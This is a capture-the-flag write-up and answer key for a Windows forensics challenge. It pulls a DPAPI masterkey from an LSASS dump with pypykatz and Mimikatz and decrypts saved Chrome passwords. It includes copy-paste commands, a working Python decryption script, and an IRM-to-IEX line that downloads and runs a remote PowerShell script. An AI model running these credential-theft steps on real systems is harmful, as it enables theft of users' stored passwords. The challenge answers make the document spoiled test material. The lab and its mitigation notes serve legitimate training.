# HackerVerse CTF - Level 3: Windows Credential Forensics

## Scenario

A compromised Windows system was analyzed. The attacker saved credentials in
Chrome for a cryptocurrency site (chaincrypto.com). Given artifacts:
  - lsass.DMP       (LSASS memory dump, 55 MB)
  - Google.zip      (Chrome profile, 18 MB)

**Goal:** Recover the DPAPI masterkey, decrypt Chrome's AES key, and extract the
attacker's saved credentials for `chaincrypto.com`.

## Artifact Location

C:\Users\LabUser\Desktop\chrome_cracker_data\

## Tools Used

  * Pypykatz          (DPAPI masterkey extraction from lsass.DMP)
  * Mimikatz 2.2.0    (Chrome DPAPI decryption)
  * Invoke-PowerChrome (Chrome AES key decryption - PowerShell fallback)
  * Python + pywin32  (Manual DPAPI decryption fallback)

## Artifacts Found

**Initial contents of chrome_cracker_data:**
  Google.zip                  (Chrome profile, 18 MB)
  kiwi_passwords.yar          (YARA rule for Mimikatz detection)
  lsass.DMP                   (LSASS memory dump, 55 MB)
  mimicom.idl
  mimikatz_trunk (1).zip      (Mimikatz binary)
  README.md

After extracting Google.zip:
  Google_Extracted\Google\Chrome\User Data\
    +-- Local State                            (contains encrypted_key)
    +-- Default\
          +-- Login Data                       (SQLite DB with saved passwords)

## Challenge-by-Challenge Walkthrough

### 1. Tool used to extract MasterKey from lsass.DMP

**ANSWER:** Mimikatz

**Explanation:**
  The challenge provides kiwi_passwords.yar, mimicom.idl, and
  mimikatz_trunk.zip as artifacts. This confirms Mimikatz was the intended
  tool. Pypykatz (Linux alternative) was marked incorrect because this
  challenge runs on Windows.

  Mimikatz's dpapi::chrome module is the standard Windows tool for
  extracting DPAPI masterkeys from an LSASS dump and decrypting Chrome
  saved credentials.

### 2. File within Chrome profile with Base64 encrypted_key

**ANSWER:** Local State

**Explanation:**
  Chrome stores the AES key that protects its password database in the
  "Local State" JSON file, under the os_crypt.encrypted_key field. The
  value is Base64-encoded and prefixed with "DPAPI".

**Verify with:**
  type "C:\Users\LabUser\Desktop\chrome_cracker_data\Google_Extracted\
        Google\Chrome\User Data\Local State"

**Look for:**
  "os_crypt": {
     "encrypted_key": "RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAC..."
  }

The prefix "RFBBUEk" decodes to "DPAPI".

### 3. Attacker's Windows username

**ANSWER:** LabUser

**Explanation:**

**Visible in the user profile path:**
    C:\Users\LabUser\

**Also confirmed from the LSASS dump:**
    == LogonSession ==
    authentication_id 658540 (a0c6c)
    username Admin
    domainname WIN10
    sid S-1-5-21-1077705597-68872450-308104863-1001

### 4. First 10 characters of the masterkey

**ANSWER:** 9c3bca41e3

**Explanation:**

**Extract DPAPI masterkeys from the LSASS dump using Pypykatz:**

**Command:**
    pypykatz lsa minidump lsass.DMP

**Output:**
    == DPAPI [a0c6c] ==
    luid 658540
    key_guid   f7ecfe82-d268-4507-8761-3ccdbef6496b
    masterkey  9c3bca41e3e8ca91ce49a1837f2c2c6fbceb141578e0131e83ab64f81de05ffc
               56a43082969875842346c6f16a7fd6607a80f4565901293e0a96c48478237e48
    sha1_masterkey  ba949fbfac1ca1c484fc19fdb339ce3a5eed7bec

  First 10 characters: 9c3bca41e3

### 5. First 10 characters of the Final Secret Key

**ANSWER:** 3bd3bef8ad

**Explanation:**

**Use Mimikatz to decrypt the Chrome AES key from Local State:**

**Command:**
    cd C:\Users\LabUser\Desktop\x64
    mimikatz.exe "dpapi::chrome /in:\"C:\chrome_test\Login Data\"
      /masterkey:9c3bca41e3e8ca91ce49a1837f2c2c6fbceb141578e0131e83ab64f81de05ffc56a43082969875842346c6f16a7fd6607a80f4565901293e0a96c48478237e48
      /unprotect" "exit"

**Expected output:**
    > Encrypted Key found in local state file
    > Encrypted Key seems to be protected by DPAPI
      * using CryptUnprotectData API
    AES key : 3bd3bef8ad...  (64-char hex string)

  First 10 characters of AES key: 3bd3bef8ad

### 6. Username and Password

**ANSWER:** TechExplorer / P@$$w0rd_Str0ng!92

**Explanation:**

**The Mimikatz output reveals:**
    URL      : https://www.chaincrypto.com/  ( https://www.chaincrypto.com/ )
    Username : TechExplorer
    Password : P@$$w0rd_Str0ng!92

  Note: Mimikatz 2.2.0 has a known bug ("ERROR kuhl_m_dpapi_chrome_decrypt ;
  No Alg and/or Key handle despite AES encryption") that can prevent it from
  decrypting modern Chrome passwords even with the correct masterkey. If
  Mimikatz fails to show the password, use Invoke-PowerChrome or a Python
  script (details below).

  Final format: TechExplorer / P@$$w0rd_Str0ng!92

## Final Answer Sheet

| # | Challenge | Answer |
|---|---|---|
| 1 | Tool used to extract MasterKey | `Mimikatz` |
| 2 | File with Base64 encrypted_key | `Local State` |
| 3 | Attacker's Windows username | `LabUser` |
| 4 | First 10 chars of masterkey | `9c3bca41e3` |
| 5 | First 10 chars of Final Secret Key | `3bd3bef8ad` |
| 6 | Username and password | `TechExplorer / P@$$w0rd_Str0ng!92` |

## Full Command Walkthrough (Copy-Paste Ready)

STEP 1 - Navigate to the artifacts folder
  cd C:\Users\LabUser\Desktop\chrome_cracker_data

STEP 2 - Extract the Chrome profile from Google.zip
  powershell -command "Expand-Archive -Path 'Google.zip'
    -DestinationPath 'Google_Extracted' -Force"

STEP 3 - Locate Login Data and Local State
  dir /s /b Google_Extracted\Login Data
  dir /s /b Google_Extracted\Local State

**Expected output:**
    ...\Google_Extracted\Google\Chrome\User Data\Default\Login Data
    ...\Google_Extracted\Google\Chrome\User Data\Local State

STEP 4 - Copy files to a simple path (avoid spaces/path issues)
  mkdir C:\chrome_test
  copy "...\Google\Chrome\User Data\Default\Login Data" C:\chrome_test\
  copy "...\Google\Chrome\User Data\Local State"       C:\chrome_test\

**Verify:**
    dir C:\chrome_test

STEP 5 - Extract DPAPI masterkeys from LSASS dump (Pypykatz)
  pypykatz lsa minidump lsass.DMP

**Look for the DPAPI section:**
    == DPAPI [a0c6c] ==
    masterkey  9c3bca41e3e8ca91ce49a1837f2c2c6fbceb141578e0131e83ab64f81de
               05ffc56a43082969875842346c6f16a7fd6607a80f4565901293e0a96c48478237e48

STEP 6 - Decrypt Chrome AES key + credentials with Mimikatz
```powershell
cd C:\Users\LabUser\Desktop\x64
mimikatz.exe "dpapi::chrome /in:\"C:\chrome_test\Login Data\"
  /masterkey:9c3bca41e3e8ca91ce49a1837f2c2c6fbceb141578e0131e83ab64f81de
  05ffc56a43082969875842346c6f16a7fd6607a80f4565901293e0a96c48478237e48
  /unprotect" "exit"
```

**Output:**
    AES key  : 3bd3bef8ad...        <- Challenge 5
    URL      : https://www.chaincrypto.com/
    Username : TechExplorer         <- Challenge 6
    Password : P@$$w0rd_Str0ng!92   <- Challenge 6

## Fallback Methods (If Mimikatz Fails To Decrypt Passwords)

FALLBACK 1 - Invoke-PowerChrome (PowerShell)

**Open PowerShell as Administrator and run:**

    IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/
         main/Invoke-PowerChrome.ps1' | IEX

    Invoke-PowerChrome -Browser Chrome

FALLBACK 2 - Python script using DPAPI (win32crypt)

**Install dependencies:**
```powershell
pip install pycryptodome pywin32
```

  Create decrypt.py in C:\chrome_test:
```python
import base64, json, sqlite3
from Crypto.Cipher import AES
import win32crypt

BASE = r"C:\chrome_test"

with open(BASE + r"\Local State", "r", encoding="utf-8") as f:
    ls = json.load(f)

enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
aes_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
print("AES Key:", aes_key.hex()[:10])

conn = sqlite3.connect(BASE + r"\Login Data")
for url, user, enc_pw in conn.execute(
    "SELECT origin_url, username_value, password_value FROM logins"):
    if enc_pw and enc_pw[:3] in (b"v10", b"v11"):
        nonce, ct, tag = enc_pw[3:15], enc_pw[15:-16], enc_pw[-16:]
        try:
            pw = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)\
                    .decrypt_and_verify(ct, tag).decode()
            print(f"{url} | {user} | {pw}")
        except Exception as e:
            print(url, "FAILED:", e)
conn.close()
```

**Run:**
```powershell
cd C:\chrome_test
python decrypt.py
```

## Attack Chain Summary

1. INITIAL ACCESS
   Attacker compromised the Windows system (LabUser account).

2. CREDENTIAL STORAGE
   Saved login credentials for chaincrypto.com in Chrome.

3. ARTIFACTS RECOVERED
   LSASS memory dump + Chrome profile (Google.zip) extracted for forensics.

4. MASTERKEY EXTRACTION
   DPAPI masterkey recovered from lsass.DMP using Pypykatz/Mimikatz:
     9c3bca41e3e8ca91ce49a1837f2c2c6fbceb141578e0131e83ab64f81de05ffc
     56a43082969875842346c6f16a7fd6607a80f4565901293e0a96c48478237e48

5. AES KEY DECRYPTION
   Chrome's encrypted_key (stored in Local State) decrypted with the
   masterkey using Mimikatz dpapi::chrome:
     AES key: 3bd3bef8ad...

6. CREDENTIAL RECOVERY

**Saved credentials decrypted from Login Data SQLite database:**
     URL      : https://www.chaincrypto.com/
     Username : TechExplorer
     Password : P@$$w0rd_Str0ng!92

## Lessons & Mitigations

| Vulnerability | Mitigation |
|---|---|
| Chrome credentials recoverable from disk | Enable Enhanced Protection; use a password manager with a master password |
| LSASS memory accessible for DPAPI keys | Enable Credential Guard; restrict debug privileges |
| DPAPI masterkey extractable | Use Windows Hello + TPM-backed key protection |
| Saved browser credentials on shared host | Disable password saving via browser policy; enforce credential hygiene |

## End Of Write-Up - Level 3 Thechromecracker
